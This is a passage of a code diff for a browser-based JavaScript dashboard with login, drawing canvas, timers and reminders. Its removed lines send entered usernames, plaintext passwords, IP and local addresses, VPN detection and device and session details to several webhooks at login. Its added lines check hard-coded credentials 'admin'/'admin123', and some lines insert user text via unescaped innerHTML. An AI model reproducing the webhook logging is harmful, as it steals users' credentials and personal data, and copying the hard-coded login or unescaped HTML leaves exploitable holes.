-            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
-            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
-            { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
-            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
-            { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
-            { name: "Language", value: nav.language || "Unknown", inline: true },
-            { name: "Operating System", value: nav.platform.replace(/^(Mac|Win|Linux).*$/, '$1') || "Unknown", inline: true }, // Added field 3 (simplified OS)
-            { name: "Device Name (if available)", value: "N/A (Browser limitation)", inline: true } // Added field 4
-        ]
-    };
-}
-
-function buildConnectionLoggingEmbed(data) {
-    const nav = navigator;
-    return {
-        title: "Connection Logging System",
-        color: 0xffff00,
-        fields: [
-            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
-            { name: "Username", value: data.user.username || "N/A", inline: true },
-            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
-            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
-            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
-            { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },
-            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
-            { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
-            { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },
-            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
-            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
-            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },
-            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
-            { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
-            { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },
-            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
-            { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
-            { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
-        ]
-    };
-}
-
-function buildSessionLoggingEmbed(data) {
-    return {
-        title: "Session Logging System",
-        color: 0x00ffff,
-        fields: [
-            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
-            { name: "Username", value: data.user.username || "N/A", inline: true },
-            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
-            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
-            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
-            { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },
-            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
-            { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },
-            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
-            { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },
-            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
-            { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },
-            { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
-            { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
-            { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },
-            { name: "Idle Time", value: data.idleTime || "0s", inline: true },
-            { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
-            { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true },
-            { name: "Login Attempts Log", value: data.loginAttemptsLog.map(a => `${a.time} - ${a.status}: ${a.username}/${a.userID}`).join('\n') || "None", inline: false }, // Added field 5
-            { name: "Dashboard Activity Summary", value: activityLogs.slice(-5).map(log => log.activity).join('\n') || "None", inline: false } // Added field 6
-        ]
-    };
-}
-
-
-async function attemptLogin() {
-  const usernameInput = document.getElementById('username');
-  const passwordInput = document.getElementById('password');
-  const userIDInput = document.getElementById('userID');
-  const errorMsg = document.getElementById('errorMsg');
-  const loginBox = document.getElementById('loginBox');
-  const submitBtn = document.getElementById('submitBtn');
-
-  errorMsg.textContent = '';
-  if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
+function attemptLogin() {
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+  const userID = document.getElementById('userID').value;
+  
+  if (!username || !password || !userID) {
     showError('Please fill all fields');
-    logActivity('Login attempt failed: Missing fields', 'Login');
     return;
   }
 
-  const username = usernameInput.value;
-  const password = passwordInput.value;
-  const userID = userIDInput.value;
-  const user = findUser(username, userID);
-
-  const attemptLogEntry = {
-      time: new Date().toLocaleString(),
-      username,
-      userID,
-      status: ''
-  };
-
-  if (!user) {
-    await logInvalidUsername("Unknown", username);
-    await logInvalidIdentifier("Unknown", userID);
-    attemptLogEntry.status = 'User not found';
-    loginHistory.unshift(attemptLogEntry);
+  // Simulate login validation (replace with real authentication)
+  if (username === 'admin' && password === 'admin123' && userID === '12345') {
+    successfulLogin(username, userID);
+  } else {
     failedLogin();
-    return;
   }
+}
 
-  if (password !== user.password) {
-    await logInvalidPassword(user.name, password);
-    attemptLogEntry.status = 'Incorrect password';
-    loginHistory.unshift(attemptLogEntry);
-    failedLogin();
-    return;
-  }
-
-  // Correct login
-  loginAttempts = 3; // Reset attempts
-  updateAttemptsText();
-  errorMsg.textContent = '';
+function successfulLogin(username, userID) {
+  currentUser = username;
+  currentUserID = userID;
   
-  // Log successful credentials
-  await logUsername(user.name, username);
-  await logPassword(user.name, password);
-  await logIdentifier(user.name, userID);
-
-  // Collect data and send logs
-  const loggingData = await collectLoggingData(user, password);
-
-  // Send all 5 webhooks:
-  await Promise.all([
-    sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
-    sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
-    sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
-    sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
-    sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
-  ]);
+  // Add to login history
+  loginHistory.unshift({
+    time: new Date().toISOString(),
+    success: true,
+    username: username
+  });
   
-  attemptLogEntry.status = 'Success';
-  loginHistory.unshift(attemptLogEntry); // Add successful login to history
-  saveLoginHistory(); // Save to local storage
-
   // Show loading screen
-  document.getElementById('loginScreen').classList.remove('active');
+  document.getElementById('loginScreen').classList.add('hidden');
   document.getElementById('loadingScreen').classList.remove('hidden');
-  stopCodeRain('codeRain'); // Stop login screen code rain
-  generateCodeRain('loadingCodeRain'); // Start loading screen code rain
+  generateCodeRain('loadingCodeRain');
   
-  logActivity('Login successful, transitioning to dashboard loading', 'Login');
-
   setTimeout(() => {
     document.getElementById('loadingScreen').classList.add('hidden');
     document.getElementById('dashboard').classList.add('active');
-    stopCodeRain('loadingCodeRain'); // Stop loading screen code rain
     initializeDashboard();
   }, 3000);
 }
 
 function failedLogin() {
-  const attemptsText = document.getElementById('attemptsText');
-  const loginBox = document.getElementById('loginBox');
-  const submitBtn = document.getElementById('submitBtn');
-
   loginAttempts--;
-  attemptsText.textContent = `Attempts Left: ${loginAttempts}`;
-  loginBox.classList.add('error-shake');
+  document.getElementById('attemptsText').textContent = `Attempts Left: ${loginAttempts}`;
+  document.getElementById('loginBox').classList.add('error-shake');
   
   setTimeout(() => {
-    loginBox.classList.remove('error-shake');
+    document.getElementById('loginBox').classList.remove('error-shake');
   }, 500);
   
   if (loginAttempts <= 0) {
     showError('No attempts remaining. System locked.');
-    submitBtn.disabled = true;
-    logActivity('Max login attempts exceeded. System locked.', 'Login');
+    document.getElementById('submitBtn').disabled = true;
   } else {
     showError('Invalid credentials');
-    logActivity(`Login failed. Attempts left: ${loginAttempts}`, 'Login');
   }
-  updateLoginHistoryDisplay(); // Update login history display
+  
+  // Add to login history
+  loginHistory.unshift({
+    time: new Date().toISOString(),
+    success: false,
+    username: document.getElementById('username').value
+  });
 }
 
 function showError(message) {
@@ -2157,10 +1716,6 @@ function showError(message) {
   setTimeout(() => {
     document.getElementById('errorMsg').textContent = '';
   }, 3000);
-}
-
-function updateAttemptsText() {
-  document.getElementById('attemptsText').textContent = `Attempts Left: ${loginAttempts}`;
 }
 
 // Dashboard initialization
@@ -2172,28 +1727,18 @@ function initializeDashboard() {
   document.getElementById('currentUser').textContent = currentUser;
   document.getElementById('currentUserID').textContent = currentUserID;
   
-  const welcomeNotification = document.getElementById('welcomeNotification');
-  welcomeNotification.classList.remove('hidden');
   setTimeout(() => {
-    welcomeNotification.classList.add('hidden');
+    document.getElementById('welcomeNotification').style.display = 'none';
   }, 5000);
   
   // Initialize components
   generateCalendar();
   initializeCanvas();
-  // setupPanelDragging(); // Removed as per request: non-movable panels
+  setupPanelDragging();
   startSessionTimer();
   updateStats();
-  applyWifiLevelColors(); // Apply colors to WiFi panel
-  updateConversionUnits(); // Initialize unit converter dropdowns
-  updateActivityLogDisplay(); // Display initial activity logs
-  updateLoginHistoryDisplay(); // Display initial login history
-  loadSettings(); // Re-apply settings for dashboard
-  loadKeybinds(); // Re-apply keybinds
-  loadTextNotes(); // Load text notes
-  loadReminders(); // Load reminders
   
-  logActivity('Dashboard initialized', 'System');
+  logActivity('Dashboard initialized');
 }
 
 function generateCalendar() {
@@ -2236,69 +1781,16 @@ function generateCalendar() {
     
     calendar.appendChild(dayCell);
   }
-  logActivity('Calendar generated', 'UI');
 }
 
 function initializeCanvas() {
   canvas = document.getElementById('drawingCanvas');
   ctx = canvas.getContext('2d');
   
-  // Set initial white background
-  ctx.fillStyle = 'white';
-  ctx.fillRect(0, 0, canvas.width, canvas.height);
-  saveCanvasState(); // Save initial blank state
-
   canvas.addEventListener('mousedown', startDrawing);
   canvas.addEventListener('mousemove', draw);
   canvas.addEventListener('mouseup', stopDrawing);
   canvas.addEventListener('mouseout', stopDrawing);
-
-  document.getElementById('penColor').addEventListener('change', (e) => {
-    currentColor = e.target.value;
-    logActivity(`Brush color changed to ${currentColor}`, 'Canvas');
-  });
-  
-  document.getElementById('penThickness').addEventListener('input', (e) => {
-    currentThickness = parseInt(e.target.value);
-    logActivity(`Brush thickness changed to ${currentThickness}`, 'Canvas');
-  });
-
-  document.getElementById('penMaterial').addEventListener('change', (e) => {
-    currentMaterial = e.target.value;
-    logActivity(`Brush material changed to ${currentMaterial}`, 'Canvas');
-  });
-  logActivity('Canvas initialized', 'Canvas');
-}
-
-function saveCanvasState() {
-    if (undoStack.length >= MAX_CANVAS_HISTORY) {
-        undoStack.shift(); // Remove oldest state
-    }
-    undoStack.push(canvas.toDataURL());
-    redoStack.length = 0; // Clear redo stack on new action
-}
-
-function restoreCanvasState(stack, targetStack) {
-    if (stack.length > 0) {
-        const prevState = stack.pop();
-        targetStack.push(canvas.toDataURL()); // Save current state to target stack
-        const img = new Image();
-        img.onload = () => {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            ctx.drawImage(img, 0, 0);
-        };
-        img.src = prevState;
-    }
-}
-
-function undoCanvas() {
-    restoreCanvasState(undoStack, redoStack);
-    logActivity('Canvas undo action', 'Canvas');
-}
-
-function redoCanvas() {
-    restoreCanvasState(redoStack, undoStack);
-    logActivity('Canvas redo action', 'Canvas');
 }
 
 function startDrawing(e) {
@@ -2309,11 +1801,6 @@ function startDrawing(e) {
   
   ctx.beginPath();
   ctx.moveTo(x, y);
-  // For shapes, store initial point
-  if (currentTool === 'rectangle' || currentTool === 'circle' || currentTool === 'line') {
-      ctx.startX = x;
-      ctx.startY = y;
-  }
 }
 
 function draw(e) {
@@ -2326,147 +1813,55 @@ function draw(e) {
   ctx.lineWidth = currentThickness;
   ctx.lineCap = 'round';
   ctx.strokeStyle = currentTool === 'eraser' ? 'white' : currentColor;
-  ctx.fillStyle = currentColor; // For shapes
-
-  // Apply line material (dashed/dotted)
-  if (currentMaterial === 'dashed') {
-      ctx.setLineDash([10, 5]);
-  } else if (currentMaterial === 'dotted') {
-      ctx.setLineDash([2, 2]);
-  } else {
-      ctx.setLineDash([]);
-  }
-
-  if (currentTool === 'pen' || currentTool === 'brush' || currentTool === 'eraser') {
-    ctx.lineTo(x, y);
-    ctx.stroke();
-    ctx.beginPath();
-    ctx.moveTo(x, y);
-  } else if (currentTool === 'line') {
-      // Clear canvas and redraw line dynamically
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      if (undoStack.length > 0) { // Redraw previous state
-          const img = new Image();
-          img.onload = () => { ctx.drawImage(img, 0, 0); };
-          img.src = undoStack[undoStack.length - 1];
-      } else { // If no history, just white background
-          ctx.fillStyle = 'white';
-          ctx.fillRect(0, 0, canvas.width, canvas.height);
-      }
-      ctx.beginPath();
-      ctx.moveTo(ctx.startX, ctx.startY);
-      ctx.lineTo(x, y);
-      ctx.stroke();
-  } else if (currentTool === 'rectangle') {
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      if (undoStack.length > 0) {
-          const img = new Image();
-          img.onload = () => { ctx.drawImage(img, 0, 0); };
-          img.src = undoStack[undoStack.length - 1];
-      } else {
-          ctx.fillStyle = 'white';
-          ctx.fillRect(0, 0, canvas.width, canvas.height);
-      }
-      ctx.strokeRect(ctx.startX, ctx.startY, x - ctx.startX, y - ctx.startY);
-  } else if (currentTool === 'circle') {
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      if (undoStack.length > 0) {
-          const img = new Image();
-          img.onload = () => { ctx.drawImage(img, 0, 0); };
-          img.src = undoStack[undoStack.length - 1];
-      } else {
-          ctx.fillStyle = 'white';
-          ctx.fillRect(0, 0, canvas.width, canvas.height);
-      }
-      const radius = Math.sqrt(Math.pow(x - ctx.startX, 2) + Math.pow(y - ctx.startY, 2));
-      ctx.beginPath();
-      ctx.arc(ctx.startX, ctx.startY, radius, 0, 2 * Math.PI);
-      ctx.stroke();
-  }
+  
+  ctx.lineTo(x, y);
+  ctx.stroke();
+  ctx.beginPath();
+  ctx.moveTo(x, y);
 }
 
 function stopDrawing() {
-  if (isDrawing) {
-    saveCanvasState(); // Save state after each completed drawing action
-    logActivity(`Drew with ${currentTool} tool`, 'Canvas');
-  }
   isDrawing = false;
   ctx.beginPath();
 }
 
-function addTextToCanvas(text, x, y) {
-    ctx.font = `${currentThickness * 5}px Arial`; // Adjust font size based on thickness
-    ctx.fillStyle = currentColor;
-    ctx.fillText(text, x, y);
-    saveCanvasState();
-    logActivity(`Added text "${text}" to canvas`, 'Canvas');
-}
-
-// Event listener for text tool
-document.addEventListener('click', (e) => {
-    if (currentTool === 'text' && e.target === canvas) {
-        const text = prompt("Enter text for note:");
-        if (text) {
-            const rect = canvas.getBoundingClientRect();
-            const x = e.clientX - rect.left;
-            const y = e.clientY - rect.top;
-            addTextToCanvas(text, x, y);
-        }
-    }
-});
-
-
-function clearCanvas() {
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
-  ctx.fillStyle = 'white';
-  ctx.fillRect(0, 0, canvas.width, canvas.height);
-  saveCanvasState(); // Save blank state
-  logActivity('Canvas cleared', 'Canvas');
-}
-
-function saveCanvas() {
-  const dataURL = canvas.toDataURL();
-  localStorage.setItem('drawingCanvasState', dataURL);
-  showNotification('Canvas saved locally!');
-  logActivity('Canvas saved to local storage', 'Canvas');
-}
-
-function loadCanvas() {
-  const dataURL = localStorage.getItem('drawingCanvasState');
-  if (dataURL) {
-    const img = new Image();
-    img.onload = () => {
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      ctx.drawImage(img, 0, 0);
-      undoStack = [dataURL]; // Reset history to loaded state
-      redoStack = [];
-      showNotification('Canvas loaded from local storage!');
-      logActivity('Canvas loaded from local storage', 'Canvas');
-    };
-    img.src = dataURL;
-  } else {
-    showNotification('No saved canvas found!', 'warning');
-    logActivity('Attempted to load canvas, but none found', 'Canvas');
-  }
-}
-
-function loadTextNotes() {
-    const savedNotes = localStorage.getItem('textNotes');
-    if (savedNotes) {
-        document.getElementById('textNotes').value = savedNotes;
-    }
-}
-
-function saveTextNotes() {
-  const notes = document.getElementById('textNotes').value;
-  localStorage.setItem('textNotes', notes);
-  showNotification('Text notes saved successfully');
-  logActivity('Text notes saved', 'Notes');
-}
-
-function clearTextNotes() {
-  document.getElementById('textNotes').value = '';
-  logActivity('Text notes cleared', 'Notes');
+function setupPanelDragging() {
+  const panels = document.querySelectorAll('.panel');
+  
+  panels.forEach(panel => {
+    let isDragging = false;
+    let startX, startY, startLeft, startTop;
+    
+    panel.addEventListener('mousedown', (e) => {
+      if (e.target.classList.contains('panel-btn') || e.target.tagName === 'I') return;
+      
+      isDragging = true;
+      startX = e.clientX;
+      startY = e.clientY;
+      const rect = panel.getBoundingClientRect();
+      startLeft = rect.left;
+      startTop = rect.top;
+      
+      panel.style.position = 'fixed';
+      panel.style.zIndex = '1000';
+      panel.style.left = startLeft + 'px';
+      panel.style.top = startTop + 'px';
+    });
+    
+    document.addEventListener('mousemove', (e) => {
+      if (!isDragging) return;
+      
+      const deltaX = e.clientX - startX;
+      const deltaY = e.clientY - startY;
+      
+      panel.style.left = (startLeft + deltaX) + 'px';
+      panel.style.top = (startTop + deltaY) + 'px';
+    });
+    
+    document.addEventListener('mouseup', () => {
+      isDragging = false;
+    });
+  });
 }
 
 function startSessionTimer() {
@@ -2478,7 +1873,7 @@ function startSessionTimer() {
       const seconds = elapsed % 60;
       
       const timeString = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-      document.getElementById('sessionTimeStat').textContent = timeString; // Update stats panel
+      document.getElementById('sessionTime').textContent = timeString;
     }
   }, 1000);
 }
@@ -2486,29 +1881,18 @@ function startSessionTimer() {
 // Utility functions
 function togglePanel(panelId) {
   const panel = document.getElementById(panelId);
-  const isVisible = panel.classList.contains('active'); // Use active class for modals
+  const isVisible = panel.style.display === 'flex' || panel.style.display === 'block';
   
-  if (panel.classList.contains('settings-modal')) { // For modals
-    if (isVisible) {
-      panel.classList.remove('active');
-      stats.panelsClosed++;
-      logActivity(`Modal closed: ${panelId}`, 'Panel');
-    } else {
-      panel.classList.add('active');
-      stats.panelsOpened++;
-      logActivity(`Modal opened: ${panelId}`, 'Panel');
-    }
-  } else { // For grid panels
-    if (isVisible) {
-      panel.classList.remove('active');
-      stats.panelsClosed++;
-      logActivity(`Panel closed: ${panelId}`, 'Panel');
-    } else {
-      panel.classList.add('active');
-      stats.panelsOpened++;
-      logActivity(`Panel opened: ${panelId}`, 'Panel');
-    }
+  panel.style.display = isVisible ? 'none' : 'flex';
+  
+  if (!isVisible) {
+    stats.panelsOpened++;
+    logActivity(`Panel opened: ${panelId}`);
+  } else {
+    stats.panelsClosed++;
+    logActivity(`Panel closed: ${panelId}`);
   }
+  
   updateStats();
 }
 
@@ -2525,16 +1909,15 @@ function minimizePanel(button) {
   }
   
   stats.buttonPresses++;
-  logActivity('Panel minimized/restored', 'Panel');
-  updateStats();
+  logActivity('Panel minimized/restored');
 }
 
 function closePanel(button) {
   const panel = button.closest('.panel');
-  panel.style.display = 'none'; // Hide the panel
+  panel.style.display = 'none';
   stats.panelsClosed++;
   stats.buttonPresses++;
-  logActivity(`Panel closed: ${panel.dataset.panel}`, 'Panel');
+  logActivity(`Panel closed: ${panel.dataset.panel}`);
   updateStats();
 }
 
@@ -2543,39 +1926,29 @@ function performSearch() {
   if (!query) return;
   
   stats.searchQueries++;
-  logActivity(`Searched for: ${query}`, 'Search');
+  logActivity(`Searched for: ${query}`);
   
-  const panels = document.querySelectorAll('.panels-grid .panel');
-  let found = false;
+  // Simple search implementation
+  const panels = document.querySelectorAll('.panel');
   panels.forEach(panel => {
-    const panelTitle = panel.querySelector('.panel-title')?.textContent.toLowerCase() || '';
-    const panelContent = panel.textContent.toLowerCase();
-    
-    if (panelTitle.includes(query) || panelContent.includes(query)) {
-      panel.style.display = 'block'; // Ensure it's visible
-      panel.style.border = '2px solid var(--accent-color)';
+    const text = panel.textContent.toLowerCase();
+    if (text.includes(query)) {
+      panel.style.display = 'block';
+      panel.style.border = '2px solid #ff4500';
       setTimeout(() => {
         panel.style.border = '1px solid var(--border-color)';
       }, 2000);
-      found = true;
-    } else {
-      panel.style.display = 'none'; // Hide non-matching panels
     }
   });
-
-  if (!found) {
-      showNotification(`No panels found matching "${query}"`, 'warning');
-  }
   
   updateStats();
 }
 
-function logActivity(activity, category = 'General') {
+function logActivity(activity) {
   const timestamp = new Date().toISOString();
   activityLogs.unshift({
     timestamp,
     activity,
-    category,
     id: Date.now()
   });
   
@@ -2589,7 +1962,6 @@ function logActivity(activity, category = 'General') {
 
 function updateActivityLogDisplay() {
   const container = document.getElementById('activityLogsList');
-  if (!container) return; // Ensure container exists
   container.innerHTML = '';
   
   activityLogs.slice(0, 10).forEach(log => {
@@ -2603,43 +1975,12 @@ function updateActivityLogDisplay() {
   });
 }
 
-function updateLoginHistoryDisplay() {
-    const container = document.getElementById('loginHistoryList');
-    if (!container) return;
-    container.innerHTML = '';
-
-    loginHistory.slice(0, 10).forEach(entry => {
-        const entryElement = document.createElement('div');
-        entryElement.className = `p-2 rounded text-xs ${entry.success ? 'bg-green-900' : 'bg-red-900'}`;
-        entryElement.innerHTML = `
-            <span class="font-semibold">${entry.username}</span> - 
-            <span class="text-gray-300">${new Date(entry.time).toLocaleString()}</span> - 
-            <span class="text-gray-400">${entry.status}</span>
-        `;
-        container.appendChild(entryElement);
-    });
-}
-
-function saveLoginHistory() {
-    localStorage.setItem('loginHistory', JSON.stringify(loginHistory));
-}
-
-function loadLoginHistory() {
-    const storedHistory = localStorage.getItem('loginHistory');
-    if (storedHistory) {
-        loginHistory = JSON.parse(storedHistory);
-    }
-    updateLoginHistoryDisplay();
-}
-
-
 function updateStats() {
   document.getElementById('buttonPresses').textContent = stats.buttonPresses;
   document.getElementById('toggleSwitches').textContent = stats.toggleSwitches;
   document.getElementById('panelsOpened').textContent = stats.panelsOpened;
   document.getElementById('panelsClosed').textContent = stats.panelsClosed;
   document.getElementById('searchQueries').textContent = stats.searchQueries;
-  // Session time is updated by its own interval
 }
 
 function downloadActivityLogs() {
@@ -2661,19 +2002,13 @@ function downloadActivityLogs() {
   URL.revokeObjectURL(url);
   
   stats.buttonPresses++;
-  logActivity('Activity logs downloaded', 'System');
+  logActivity('Activity logs downloaded');
   updateStats();
 }
 
 function showStats() {
   togglePanel('statsPanel');
   
-  // Destroy existing chart if it exists
-  const existingChart = Chart.getChart('statsChart');
-  if (existingChart) {
-      existingChart.destroy();
-  }
-
   // Create stats chart
   const ctx = document.getElementById('statsChart').getContext('2d');
   new Chart(ctx, {
@@ -2682,7 +2017,7 @@ function showStats() {
       labels: ['Button Presses', 'Toggle Switches', 'Panels Opened', 'Panels Closed', 'Search Queries'],
       datasets: [{
         data: [stats.buttonPresses, stats.toggleSwitches, stats.panelsOpened, stats.panelsClosed, stats.searchQueries],
-        backgroundColor: ['var(--accent-color)', 'var(--accent-secondary)', 'var(--success-color)', 'var(--warning-color)', 'var(--accent-color)']
+        backgroundColor: ['#ff4500', '#ff6b35', '#00ff41', '#ffaa00', '#0066cc']
       }]
     },
     options: {
@@ -2691,13 +2026,12 @@ function showStats() {
       plugins: {
         legend: {
           labels: {
-            color: 'var(--text-primary)'
+            color: 'white'
           }
         }
       }
     }
   });
-  logActivity('Stats panel opened and chart displayed', 'Stats');
 }
 
 // Timer functions
@@ -2705,10 +2039,10 @@ function startStopwatch() {
   if (!isStopwatchRunning) {
     isStopwatchRunning = true;
     stopwatchInterval = setInterval(() => {
-      stopwatchTime++; // Increment by centiseconds
+      stopwatchTime++;
       updateStopwatchDisplay();
-    }, 10); // Update every 10ms for centiseconds
-    logActivity('Stopwatch started', 'Timer');
+    }, 10);
+    logActivity('Stopwatch started');
   }
 }
 
@@ -2716,7 +2050,7 @@ function pauseStopwatch() {
   if (isStopwatchRunning) {
     isStopwatchRunning = false;
     clearInterval(stopwatchInterval);
-    logActivity('Stopwatch paused', 'Timer');
+    logActivity('Stopwatch paused');
   }
 }
 
@@ -2725,7 +2059,7 @@ function resetStopwatch() {
   clearInterval(stopwatchInterval);
   stopwatchTime = 0;
   updateStopwatchDisplay();
-  logActivity('Stopwatch reset', 'Timer');
+  logActivity('Stopwatch reset');
 }
 
 function updateStopwatchDisplay() {
@@ -2754,18 +2088,18 @@ function startTimer() {
       
       if (timerTime <= 0) {
         pauseTimer();
-        showNotification('Timer finished!', 'success');
-        logActivity('Timer completed', 'Timer');
+        showNotification('Timer finished!');
+        logActivity('Timer completed');
       }
     }, 1000);
-    logActivity('Timer started', 'Timer');
+    logActivity('Timer started');
   }
 }
 
 function pauseTimer() {
   isTimerRunning = false;
   clearInterval(timerInterval);
-  logActivity('Timer paused', 'Timer');
+  logActivity('Timer paused');
 }
 
 function resetTimer() {
@@ -2773,10 +2107,7 @@ function resetTimer() {
   clearInterval(timerInterval);
   timerTime = 0;
   updateTimerDisplay();
-  document.getElementById('timerHours').value = '';
-  document.getElementById('timerMinutes').value = '';
-  document.getElementById('timerSeconds').value = '';
-  logActivity('Timer reset', 'Timer');
+  logActivity('Timer reset');
 }
 
 function updateTimerDisplay() {
@@ -2788,7 +2119,6 @@ function updateTimerDisplay() {
     `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
 }
 
-let reminders = [];
 function addReminder() {
   const text = document.getElementById('reminderText').value;
   const time = document.getElementById('reminderTime').value;
@@ -2800,217 +2130,127 @@ function addReminder() {
     if (reminderTime > now) {
       const timeout = reminderTime.getTime() - now.getTime();
       
-      const newReminder = { text, time: reminderTime.toISOString(), id: Date.now() };
-      reminders.push(newReminder);
-      saveReminders();
-      
       setTimeout(() => {
-        showNotification(`Reminder: ${text}`, 'info');
-        // Remove reminder after it triggers
-        reminders = reminders.filter(r => r.id !== newReminder.id);
-        saveReminders();
-        renderReminders();
+        showNotification(`Reminder: ${text}`);
       }, timeout);
+      
+      const reminderElement = document.createElement('div');
+      reminderElement.className = 'p-2 bg-gray-700 rounded';
+      reminderElement.innerHTML = `
+        <div class="font-semibold">${text}</div>
+        <div class="text-sm text-gray-400">${reminderTime.toLocaleString()}</div>
+      `;
+      
+      document.getElementById('remindersList').appendChild(reminderElement);
       
       document.getElementById('reminderText').value = '';
       document.getElementById('reminderTime').value = '';
       
-      renderReminders();
-      showNotification(`Reminder set: ${text}`, 'success');
-      logActivity(`Reminder set: ${text}`, 'Reminders');
-    } else {
-        showNotification('Reminder time must be in the future.', 'error');
+      logActivity(`Reminder set: ${text}`);
     }
-  } else {
-      showNotification('Please enter both reminder text and time.', 'warning');
   }
 }
 
-function renderReminders() {
-    const remindersList = document.getElementById('remindersList');
-    remindersList.innerHTML = '';
-    reminders.sort((a, b) => new Date(a.time) - new Date(b.time)); // Sort by time
-
-    if (reminders.length === 0) {
-        remindersList.innerHTML = '<p class="text-gray-500">No active reminders.</p>';
-        return;
-    }
-
-    reminders.forEach(r => {
-        const reminderElement = document.createElement('div');
-        reminderElement.className = 'p-2 bg-gray-700 rounded flex justify-between items-center';
-        reminderElement.innerHTML = `
-            <div>
-                <div class="font-semibold">${r.text}</div>
-                <div class="text-sm text-gray-400">${new Date(r.time).toLocaleString()}</div>
-            </div>
-            <button class="text-red-400 hover:text-red-600" onclick="deleteReminder(${r.id})"><i class="fas fa-trash"></i></button>
-        `;
-        remindersList.appendChild(reminderElement);
-    });
-}
-
-function deleteReminder(id) {
-    reminders = reminders.filter(r => r.id !== id);
-    saveReminders();
-    renderReminders();
-    showNotification('Reminder deleted.', 'info');
-    logActivity('Reminder deleted', 'Reminders');
-}
-
-function saveReminders() {
-    localStorage.setItem('reminders', JSON.stringify(reminders));
-}
-
-function loadReminders() {
-    const storedReminders = localStorage.getItem('reminders');
-    if (storedReminders) {
-        reminders = JSON.parse(storedReminders);
-        // Re-set timeouts for loaded reminders
-        reminders.forEach(r => {
-            const reminderTime = new Date(r.time);
-            const now = new Date();
-            if (reminderTime > now) {
-                const timeout = reminderTime.getTime() - now.getTime();
-                setTimeout(() => {
-                    showNotification(`Reminder: ${r.text}`, 'info');
-                    reminders = reminders.filter(rem => rem.id !== r.id);
-                    saveReminders();
-                    renderReminders();
-                }, timeout);
-            } else { // If reminder is already past, remove it
-                reminders = reminders.filter(rem => rem.id !== r.id);
-                saveReminders();
-            }
-        });
-        renderReminders();
-    }
-}
-
-
 // Drawing tools
-// `selectTool` is already defined in HTML, just ensure it updates `currentTool`
-// `clearCanvas` is already defined in HTML
-// `saveCanvas` is already defined in HTML
+function selectTool(button, tool) {
+  document.querySelectorAll('.tool-btn[data-tool]').forEach(btn => btn.classList.remove('active'));
+  button.classList.add('active');
+  currentTool = tool;
+  
+  const canvas = document.getElementById('drawingCanvas');
+  canvas.style.cursor = tool === 'eraser' ? 'crosshair' : 'crosshair';
+  
+  logActivity(`Drawing tool changed to: ${tool}`);
+}
+
+function clearCanvas() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  logActivity('Canvas cleared');
+}
+
+function saveCanvas() {
+  const link = document.createElement('a');
+  link.download = `drawing_${Date.now()}.png`;
+  link.href = canvas.toDataURL();
+  link.click();
+  logActivity('Canvas saved');
+}
 
 // Calculator functions
 function appendToCalc(value) {
   const display = document.getElementById('calcDisplay');
-  if (calcResetDisplay) {
-      calcDisplayValue = value;
